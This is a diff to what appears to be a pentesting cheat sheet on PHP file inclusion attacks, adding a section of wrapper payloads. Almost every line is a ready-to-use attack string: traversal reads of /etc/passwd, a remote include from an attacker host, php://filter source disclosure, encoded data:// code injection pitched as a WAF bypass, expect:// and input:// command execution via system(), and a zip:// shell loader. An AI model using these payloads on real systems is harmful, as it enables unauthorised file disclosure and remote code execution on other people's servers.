@@ -17,8 +17,44 @@ http://example.com/index.php?page=../../../etc/passwd (3 dots in Linux)
 http://example.com/index.php?page=http://attacker.net/eval.php.txt (Remote File Inclusion)
 ```
 
-**PHP wrappers & protocols**
+# PHP wrappers & protocols
+
+**php://filter**
 
 ```
+http://example.com/index.php?page=php://filter/zlib.deflate/convert.base64-encode/resource=/etc/passwd
+http://example.com/index.php?page=php://filter/convert.base64-encode/resource=index.php
+http://example.com/index.php?page=php://filter/convert.iconv.utf-8.utf-16/resource=index.php
+http://example.com/index.php?page=php://filter/read=string.rot13/resource=index.php
+```
 
+**data://**
+
+```
+http://example.com/index.php?page=data://text/plain;base64,%50%44%39%77%61%48%41%67%63%33%6c%7a%64%47%56%74%4b%43%64%73%63%79%63%70%4f%79%41%2f%50%67%3d%3d (Useful For WAF bypass)
+http://example.com/index.php?page=data:text/plain,%3c%3f%70%68%70%20%70%68%70%69%6e%66%6f%28%29%3b%20%3f%3e (Will print php info)
+```
+
+**expect://**
+
+```
+http://example.com/index.php?page=expect://ls [For fopen Function]
+```
+
+**input://**
+
+```
+curl -X POST -d "<?php system('ls'); ?>" http://example.com/index.php?page=input://
+```
+
+**php://fd/**
+
+```
+http://example.com/index.php?page=php://fd/[0-9] (Opened Files In Current Process)
+```
+
+**zip://**
+
+```
+http://example.com/index.php?page=zip://path-to-zip-file/%23shell.php
 ```
